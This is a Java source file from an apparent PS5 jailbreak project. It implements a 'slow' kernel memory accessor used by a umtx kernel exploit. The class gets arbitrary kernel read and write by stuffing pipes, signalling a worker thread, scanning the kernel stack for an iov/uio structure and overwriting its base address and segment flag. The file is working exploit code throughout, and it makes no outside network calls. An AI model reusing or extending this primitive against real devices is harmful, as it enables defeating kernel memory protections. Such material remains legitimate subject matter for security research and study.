package org.ps5jb.client.payloads.umtx.impl2;

import java.io.IOException;
import java.io.NotActiveException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

import org.ps5jb.client.payloads.umtx.common.DebugStatus;
import org.ps5jb.loader.KernelAccessor;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.core.SdkRuntimeException;
import org.ps5jb.sdk.include.sys.uio.UioType;
import org.ps5jb.sdk.lib.LibKernel;

class KernelAccessorSlow implements KernelAccessor {
    private static final long OFFSET_IOV_BASE = 0x00;
    private static final long OFFSET_IOV_LEN = 0x08;
    private static final long SIZE_IOV = 0x10;
    private static final long OFFSET_UIO_RESID = 0x18;
    private static final long OFFSET_UIO_SEGFLG = 0x20;
    private static final long OFFSET_UIO_RW = 0x24;

    private final UmtxExploitJob.KPrimThreadData kPrimThreadData;
    private final Pointer kstack;
    private final LibKernel libKernel;
    private long kernelBase;

    KernelAccessorSlow(UmtxExploitJob.KPrimThreadData kPrimThreadData, Pointer kstack) {
        this.kPrimThreadData = kPrimThreadData;
        this.kstack = kstack;
        this.libKernel = new LibKernel();
    }

    private void sendCommand(int cmd, long uaddr, long kaddr, int len) {
        if (len > UmtxExploitJob.KPRIM_BUF_SIZE) {
            throw new IllegalArgumentException("Length cannot be greater than " + UmtxExploitJob.KPRIM_BUF_SIZE);
        }

        // Take the thread out of reset
        kPrimThreadData.resetSignal.set(false);

        // Set args
        kPrimThreadData.uaddr.set(uaddr);
        kPrimThreadData.kaddr.set(kaddr);
        kPrimThreadData.len.set(len);

        // Set command, we do this last because it kickstarts the thread to do stuff
        kPrimThreadData.cmd.set(cmd);

        libKernel.usleep(50000L);
        if (DebugStatus.isTraceEnabled()) {
            DebugStatus.trace("[+] kprim send (" + cmd + ", 0x" + Long.toHexString(uaddr) + ", 0x" + Long.toHexString(kaddr) + "), len=" + len + ", read=" + kPrimThreadData.readCounter.get() + ", write=" + kPrimThreadData.writeCounter.get());
        }

        // Command is done, clear the command and put the thread into reset
        kPrimThreadData.resetSignal.set(true);
    }

    private boolean swapIovInKstack(long origIovBase, long newIovBase, int uioSegFlg, int uioRw, int len) {
        // Find iov+uio pair on the stack
        long stack_iov_offset = -1;

        long scan_max = 0x1000 - UioType.SIZE;
        for (long i = 0; i < scan_max; i += 0x4) {
            long possible_iov_base = kstack.read8(0x3000 + i + OFFSET_IOV_BASE);
            long possible_iov_len = kstack.read8(0x3000 + i + OFFSET_IOV_LEN);

            if (possible_iov_base == origIovBase && possible_iov_len == len) {
                long possible_uio_resid = kstack.read8(0x3000 + i + SIZE_IOV + OFFSET_UIO_RESID);
                int possible_uio_segflg = kstack.read4(0x3000 + i + SIZE_IOV + OFFSET_UIO_SEGFLG);
                int possible_uio_rw = kstack.read4(0x3000 + i + SIZE_IOV + OFFSET_UIO_RW);

                if (possible_uio_resid == len && possible_uio_segflg == 0 && possible_uio_rw == uioRw) {
                    if (DebugStatus.isDebugEnabled()) {
                        DebugStatus.debug("[+] found iov on stack @ 0x" + Long.toHexString(i));
                    }
                    stack_iov_offset = i;
                    break;
                }
            }
        }

        if (stack_iov_offset < 0) {
            //Status.println("[+] iov not found in stack");
            return false;
        }

        // Modify iov for kernel address + r/w
        kstack.write8(0x3000 + stack_iov_offset + OFFSET_IOV_BASE, newIovBase);
        kstack.write4(0x3000 + stack_iov_offset + SIZE_IOV + OFFSET_UIO_SEGFLG, uioSegFlg);
        return true;
    }

    void slowCopyOut(long kaddr, Pointer uaddr, int len) {
        // Fill pipe up to max
        long totalGarbageSize = 0;
        for (long i = 0; i < UmtxExploitJob.PIPE_SLOW_SIZE; i += UmtxExploitJob.PIPE_SLOW_BATCH_SIZE) {
            long writeBytes = libKernel.write(kPrimThreadData.pipeSlowWriteFd, kPrimThreadData.pipeSlowScratchBuf, UmtxExploitJob.PIPE_SLOW_BATCH_SIZE);
            if (writeBytes != UmtxExploitJob.PIPE_SLOW_BATCH_SIZE) {
                throw new SdkRuntimeException("Unable to fill write pipe with garbage data");
            }
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("Written " + writeBytes + " to pipe fd #" + kPrimThreadData.pipeSlowWriteFd);
            }
            totalGarbageSize += writeBytes;
        }
        if (DebugStatus.isTraceEnabled()) {
            DebugStatus.trace("Total garbage bytes " + totalGarbageSize);
        }

        // Signal other thread to write using size we want, the thread will hang until we read
        sendCommand(UmtxExploitJob.KPRIM_READ, uaddr.addr(), kaddr, len);

        if (!swapIovInKstack(kPrimThreadData.pipeSlowScratchBuf.addr(), kaddr, 1, 1, len)) {
            SdkRuntimeException rootEx = new SdkRuntimeException("Unable to swap iov, pattern not found");
            SdkRuntimeException causeEx = new SdkRuntimeException("Unable to unblock the read pipe following a failed read attempt. Deadlock may occur", rootEx);
            // Unblock the thread
            if (libKernel.read(kPrimThreadData.pipeSlowReadFd, kPrimThreadData.pipeSlowScratchBuf, UmtxExploitJob.PIPE_SLOW_SIZE) != UmtxExploitJob.PIPE_SLOW_SIZE) {
                throw causeEx;
            }
            if (libKernel.read(kPrimThreadData.pipeSlowReadFd, uaddr, len) != len) {
                throw causeEx;
            }
            throw rootEx;
        }

        // Read garbage filler data
        long readGarbageSize = libKernel.read(kPrimThreadData.pipeSlowReadFd, kPrimThreadData.pipeSlowScratchBuf, UmtxExploitJob.PIPE_SLOW_SIZE);
        if (readGarbageSize != UmtxExploitJob.PIPE_SLOW_SIZE) {
            throw new SdkRuntimeException("Unable to unlock the pipe. Read: " + readGarbageSize + ". Expected: " + totalGarbageSize);
        }
        if (DebugStatus.isTraceEnabled()) {
            DebugStatus.trace("Read " + readGarbageSize + " garbage bytes");
        }

        // Read kernel data
        long read = libKernel.read(kPrimThreadData.pipeSlowReadFd, uaddr, len);
        if (read != len) {
            throw new SdkRuntimeException("Unexpected number of bytes read: " + read + " instead of " + len);
        }
        if (DebugStatus.isDebugEnabled()) {
            DebugStatus.debug("Read " + read + " bytes");
        }
    }

    void slowCopyIn(Pointer uaddr, long kaddr, int len) {
        // Signal other thread to read using size we want, the thread will hang until we write
        sendCommand(UmtxExploitJob.KPRIM_WRITE, uaddr.addr(), kaddr, len);

        if (!swapIovInKstack(kPrimThreadData.pipeSlowScratchBuf.addr(), kaddr, 1, 0, len)) {
            // Unblock the thread
            libKernel.read(kPrimThreadData.pipeSlowWriteFd, uaddr, len);
            throw new SdkRuntimeException("Unable to swap iov, pattern not found");
        }

        // Write data to write to pointer
        long written = libKernel.write(kPrimThreadData.pipeSlowWriteFd, uaddr, len);
        if (written != len) {
            throw new SdkRuntimeException("Unexpected number of bytes written: " + written + " instead of " + len);
        }
    }

    @Override
    public byte read1(long kernelAddress) {
        slowCopyOut(kernelAddress, kPrimThreadData.slowReadValue, 1);
        return kPrimThreadData.slowReadValue.read1();
    }

    @Override
    public short read2(long kernelAddress) {
        slowCopyOut(kernelAddress, kPrimThreadData.slowReadValue, 2);
        return kPrimThreadData.slowReadValue.read2();
    }

    @Override
    public int read4(long kernelAddress) {
        slowCopyOut(kernelAddress, kPrimThreadData.slowReadValue, 4);
        return kPrimThreadData.slowReadValue.read4();
    }

    @Override
    public long read8(long kernelAddress) {
        slowCopyOut(kernelAddress, kPrimThreadData.slowReadValue, 8);
        return kPrimThreadData.slowReadValue.read8();
    }

    @Override
    public void write1(long kernelAddress, byte value) {
        kPrimThreadData.slowWriteValue.write1(value);
        slowCopyIn(kPrimThreadData.slowWriteValue, kernelAddress, 1);
    }

    @Override
    public void write2(long kernelAddress, short value) {
        kPrimThreadData.slowWriteValue.write2(value);
        slowCopyIn(kPrimThreadData.slowWriteValue, kernelAddress, 2);
    }

    @Override
    public void write4(long kernelAddress, int value) {
        kPrimThreadData.slowWriteValue.write4(value);
        slowCopyIn(kPrimThreadData.slowWriteValue, kernelAddress, 4);
    }

    @Override
    public void write8(long kernelAddress, long value) {
        kPrimThreadData.slowWriteValue.write8(value);
        slowCopyIn(kPrimThreadData.slowWriteValue, kernelAddress, 8);
    }

    @Override
    public long getKernelBase() {
        return kernelBase;
    }

    public void setKernelBase(long kernelBase) {
        this.kernelBase = kernelBase;
    }

    public Pointer getKstack() {
        return kstack;
    }

    private void readObject(ObjectInputStream ois) throws ClassNotFoundException, IOException {
        // Do not allow to deserialize this class
        throw new NotActiveException("Slow kernel accessor cannot be restored");
    }

    private void writeObject(ObjectOutputStream oos) throws IOException {
        // Do not allow to serialize this class
        throw new NotActiveException("Slow kernel accessor cannot be saved");
    }
}
